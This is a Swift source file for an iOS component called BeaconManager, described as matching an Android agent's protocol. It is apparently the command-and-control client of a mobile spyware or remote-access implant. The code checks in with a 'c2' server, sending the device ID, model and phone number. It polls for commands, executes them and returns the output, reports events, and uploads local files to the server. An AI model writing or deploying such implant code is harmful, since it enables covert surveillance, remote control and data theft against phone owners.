//
//  BeaconManager.swift
//  HTTP JSON beacon — same protocol as the Android agent.
//

import Foundation
import UIKit

final class BeaconManager {

    static let shared = BeaconManager()
    private let prefs = Prefs.shared
    private var timer: Timer?
    private var busy = false

    private init() {}

    func start() {
        timer?.invalidate()
        timer = Timer.scheduledTimer(withTimeInterval: TimeInterval(prefs.interval), repeats: true) { [weak self] _ in
            self?.tick { _ in }
        }
    }

    func restartWithNewInterval() {
        start()
    }

    /// One beacon cycle: checkin -> poll -> execute -> report.
    func tick(completion: @escaping () -> Void) {
        guard !busy else { completion(); return }
        busy = true
        checkin { [weak self] ok in
            guard let self = self, ok else { self?.busy = false; completion(); return }
            self.pollCommands { commands in
                let group = DispatchGroup()
                for cmd in commands {
                    group.enter()
                    CommandHandler.handle(cmd: cmd.cmd, args: cmd.args) { output in
                        self.sendResult(cmdId: cmd.id, output: output)
                        group.leave()
                    }
                }
                group.notify(queue: .global()) {
                    self.busy = false
                    completion()
                }
            }
        }
    }

    // MARK: - endpoints

    private func checkin(completion: @escaping (Bool) -> Void) {
        var body: [String: Any] = [
            "device_id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "model": UIDevice.current.modelName,
            "brand": "Apple",
            "android": UIDevice.current.systemVersion,
            "sdk": 0
        ]
        if let phone = DeviceInfo.shared.phoneNumber() {
            body["phone"] = phone
        }
        post(path: "/api/checkin", json: body) { data in
            guard let data = data,
                  let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let aid = obj["agent_id"] as? String else {
                completion(false)
                return
            }
            if let iv = obj["interval"] as? Int, iv != self.prefs.interval {
                self.prefs.interval = iv
                self.restartWithNewInterval()
            }
            self.prefs.agentId = aid
            completion(true)
        }
    }

    private func pollCommands(completion: @escaping ([Command]) -> Void) {
        guard let aid = prefs.agentId else { completion([]); return }
        get(path: "/api/commands/" + aid) { data in
            guard let data = data,
                  let arr = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] else {
                completion([])
                return
            }
            completion(arr.compactMap {
                guard let id = $0["id"] as? String, let cmd = $0["cmd"] as? String else { return nil }
                return Command(id: id, cmd: cmd, args: $0["args"] as? String ?? "")
            })
        }
    }

    func sendResult(cmdId: String, output: String) {
        post(path: "/api/result", json: [
            "agent_id": prefs.agentId ?? "",
            "cmd_id": cmdId,
            "output": output
        ]) { _ in }
    }

    func sendEvent(type: String, pkg: String, text: String) {
        post(path: "/api/event", json: [
            "agent_id": prefs.agentId ?? "",
            "type": type,
            "pkg": pkg,
            "text": text,
            "time": Int(Date().timeIntervalSince1970)
        ]) { _ in }
    }

    func uploadFile(url: URL, name: String, completion: @escaping (Bool) -> Void) {
        guard let aid = prefs.agentId else { completion(false); return }
        guard let data = try? Data(contentsOf: url) else { completion(false); return }
        let boundary = "----warden" + UUID().uuidString
        var req = URLRequest(url: URL(string: prefs.c2 + "/api/upload?agent_id=\(aid)&name=\(name)")!)
        req.httpMethod = "POST"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        var body = Data()
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"file\"; filename=\"\(name)\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: application/octet-stream\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)
        URLSession.shared.uploadTask(with: req, from: body) { _, resp, _ in
            completion((resp as? HTTPURLResponse)?.statusCode == 200)
        }.resume()
    }

    // MARK: - transport

    private func get(path: String, completion: @escaping (Data?) -> Void) {
        guard let url = URL(string: prefs.c2 + path) else { completion(nil); return }
        var req = URLRequest(url: url)
        req.timeoutInterval = 20
        URLSession.shared.dataTask(with: req) { data, resp, _ in
            guard let http = resp as? HTTPURLResponse, http.statusCode == 200 else {
                completion(nil)
                return
            }
            completion(data)
        }.resume()
    }

    private func post(path: String, json: [String: Any], completion: @escaping (Data?) -> Void) {
        guard let url = URL(string: prefs.c2 + path) else { completion(nil); return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.timeoutInterval = 20
        req.httpBody = try? JSONSerialization.data(withJSONObject: json)
        URLSession.shared.dataTask(with: req) { data, resp, _ in
            guard let http = resp as? HTTPURLResponse, http.statusCode == 200 else {
                completion(nil)
                return
            }
            completion(data)
        }.resume()
    }
}

struct Command {
    let id: String
    let cmd: String
    let args: String
}

extension UIDevice {
    var modelName: String {
        var sys = utsname()
        uname(&sys)
        let mirror = Mirror(reflecting: sys.machine)
        return mirror.children.reduce("") { id, element in
            guard let value = element.value as? Int8, value != 0 else { return id }
            return id + String(UnicodeScalar(UInt8(value)))
        }
    }
}
